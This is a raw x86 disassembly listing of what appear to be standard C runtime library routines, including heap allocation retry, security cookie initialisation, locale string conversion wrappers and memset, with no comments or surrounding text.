  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
